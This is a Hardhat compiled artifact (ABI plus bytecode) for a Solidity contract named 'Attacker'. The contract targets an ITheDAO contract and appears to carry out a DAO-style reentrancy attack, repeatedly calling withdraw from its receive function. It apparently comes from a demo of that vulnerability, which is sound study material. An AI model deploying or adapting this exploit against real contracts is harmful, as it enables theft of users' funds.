{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/Attacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attackAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "count",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vulnerable",
      "outputs": [
        {
          "internalType": "contract ITheDAO",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x6080604052670de0b6b3a764000060015560405161069b38038061069b833981810160405281019061003191906100da565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610107565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a78261007c565b9050919050565b6100b78161009c565b81146100c257600080fd5b50565b6000815190506100d4816100ae565b92915050565b6000602082840312156100f0576100ef610077565b5b60006100fe848285016100c5565b91505092915050565b610585806101166000396000f3fe60806040526004361061004e5760003560e01c806306661abd1461014a57806312065fe01461017557806388193565146101a05780639e5faafc146101cb578063f66ad59a146101d557610145565b366101455760015460008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311015801561009e57506005600254105b1561014357600260008154809291906100b6906103c6565b919050555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6001546040518263ffffffff1660e01b8152600401610116919061041d565b600060405180830381600087803b15801561013057600080fd5b505af1925050508015610141575060015b505b005b600080fd5b34801561015657600080fd5b5061015f610200565b60405161016c919061041d565b60405180910390f35b34801561018157600080fd5b5061018a610206565b604051610197919061041d565b60405180910390f35b3480156101ac57600080fd5b506101b561020e565b6040516101c2919061041d565b60405180910390f35b6101d3610214565b005b3480156101e157600080fd5b506101ea610369565b6040516101f791906104b7565b60405180910390f35b60025481565b600047905090565b60015481565b600154341015610259576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102509061052f565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d7bb99ba346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102c157600080fd5b505af11580156102d5573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6001546040518263ffffffff1660e01b8152600401610335919061041d565b600060405180830381600087803b15801561034f57600080fd5b505af1158015610363573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000819050919050565b60006103d1826103bc565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036104035761040261038d565b5b600182019050919050565b610417816103bc565b82525050565b6000602082019050610432600083018461040e565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061047d61047861047384610438565b610458565b610438565b9050919050565b600061048f82610462565b9050919050565b60006104a182610484565b9050919050565b6104b181610496565b82525050565b60006020820190506104cc60008301846104a8565b92915050565b600082825260208201905092915050565b7f4e656564206174206c6561737420312045544820746f2061747461636b000000600082015250565b6000610519601d836104d2565b9150610524826104e3565b602082019050919050565b600060208201905081810360008301526105488161050c565b905091905056fea2646970667358221220442a95837648bc8b244da7aeee93f475ddcc26cf5c4bc3709ea037b9bb5194bc64736f6c63430008140033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}